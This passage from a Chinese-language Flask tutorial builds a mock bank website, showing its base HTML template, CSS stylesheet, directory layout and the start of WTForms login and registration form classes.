title="1.base.html"></a>1.<code>base.html</code></h5><blockquote><p>主要是用来搭建轮廓</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>       <span class="token comment" spellcheck="true">&lt;!-- 此处填写页面标题 --></span>       {% block block_title %}>          {% endblock block_title %}>      >      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>css/base.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename<span class="token punctuation">=</span><span class="token punctuation">'</span>js/jquery.min.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>>      >      {% block block_script %} >      {% endblock block_script %}>   >   >   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>>      >      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer_container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/posts/10002.png<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>          {# 导航栏#}>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>index<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>login<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>personal<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>个人信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>register<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>savemoney<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>存钱<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>transfer<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>转账<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>logout<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>退出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>          {% block block_get %} >          {% endblock %}       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           {% block block_post %}>              {% endblock %}       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>欢迎您来到智商银行<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页面的<code>css</code>文件如下(根据自己的需求去修改)</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">body</span><span class="token punctuation">{</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.outer_container</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">1007</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">1100</span>px<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/*居中对齐*/</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>   <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>   <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.log</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/*居中对齐*/</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.navigation</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/*居中对齐*/</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.navigation</span> ul</span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>   <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#55a8ea</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 清除点 */</span>   <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 清除默认Padding */</span>   <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 设置居中 */</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 清除间隙 */</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>   <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.navigation</span> ul li</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">/* 转化行内块元素 */</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">137</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 设置居中 */</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>   <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.navigation</span> ul li a</span><span class="token punctuation">{</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>   <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.navigation</span> ul li<span class="token pseudo-class">:hover</span></span><span class="token punctuation">{</span>   <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#00619f</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_container</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">500</span>px<span class="token punctuation">;</span>   <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">30</span>px auto<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_h2</span></span><span class="token punctuation">{</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_box</span></span><span class="token punctuation">{</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">398</span>px<span class="token punctuation">;</span>   <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>   <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">10</span>px <span class="token number">100</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_img</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">10</span>px <span class="token number">2</span>px<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_1</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">354</span>px<span class="token punctuation">;</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_1</span> input</span><span class="token punctuation">{</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">354</span>px<span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">17</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_lifetime</span></span><span class="token punctuation">{</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">36</span>px<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">360</span>px<span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">16</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">10</span>px <span class="token number">100</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_submit</span></span><span class="token punctuation">{</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">398</span>px<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">5</span>px auto<span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_submit</span> input</span><span class="token punctuation">{</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">390</span>px<span class="token punctuation">;</span>   <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#55a8ea</span><span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">22</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_2</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">400</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">56</span>px<span class="token punctuation">;</span>   <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">10</span>px <span class="token number">100</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_2</span> label</span><span class="token punctuation">{</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">60</span>px<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_2</span> input</span><span class="token punctuation">{</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">330</span>px<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_2</span> span</span><span class="token punctuation">{</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">12</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#999</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_trans</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>   <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">10</span>px <span class="token number">2</span>px<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_3</span></span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">314</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>   <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>   <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.in_input_3</span> input</span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">314</span>px<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">17</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">footer</span><span class="token punctuation">{</span>   <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>   <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>   <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>   <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">24</span>px<span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> aqua<span class="token punctuation">;</span>   <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#55a8ea</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>jQuery</code>文件需要自己去下载任意版本.图片可以使用使用我的图片(参考代码示例),搭建出基本的框架,如果需要修改,需要自己去修改.</p></blockquote><h5 id="2-其他页面"><a href="#2-其他页面" class="headerlink" title="2.其他页面"></a>2.其他页面</h5><blockquote><p>参考示例代码,都是基本的<code>html</code></p></blockquote><h5 id="3-目录结构"><a href="#3-目录结构" class="headerlink" title="3.目录结构"></a>3.目录结构</h5><blockquote><p>整个目录结构如下</p><pre class="line-numbers language-bash"><code class="language-bash">❯ tree<span class="token keyword">.</span>├── app.py├── config.py├── static│   ├── css│   │   └── base.css│   ├── images│   │   ├── 10001.png│   │   ├── 10002.png│   │   ├── 10003.png│   │   ├── ico-password.png│   │   └── ico-user.png│   └── js│       └── jquery.min.js└── templates   ├── base.html   ├── index.html   ├── login.html   ├── personal.html   ├── register.html   ├── savemoney.html   └── transfer.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h5 id="4-运行效果"><a href="#4-运行效果" class="headerlink" title="4.运行效果"></a>4.运行效果</h5><blockquote><p>保证整个项目运行的时候能够自由的切换到各个页面.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-14/1602683281322-10312.gif" alt="10312"></p></blockquote><h4 id="3-构造表单"><a href="#3-构造表单" class="headerlink" title="3.构造表单"></a>3.构造表单</h4><blockquote><p>根据前端的页面,构造后端的表单<code>formModel.py</code>,用于实现基本的表单验证.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> PasswordField<span class="token punctuation">,</span> IntegerField<span class="token punctuation">,</span> FloatField<span class="token punctuation">,</span> BooleanField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span> Email<span class="token punctuation">,</span> EqualTo<span class="token punctuation">,</span> Regexp<span class="token punctuation">,</span> NumberRange<span class="token keyword">class</span> <span class="token class-name">LoginForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""构造登录页面验证表单"""</span>   email <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Email<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">"邮箱不符合"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">"密码长度不够"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 不验证复杂度</span>   lifetime <span class="token operator">=</span> BooleanField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 验证为空,默认是False, 选择checkbox 变成True</span><span class="token keyword">class</span> <span class="token class-name">RegisterForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""构造注册页面表单验证"""</span>   email <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Email<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">"邮箱不符合"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span 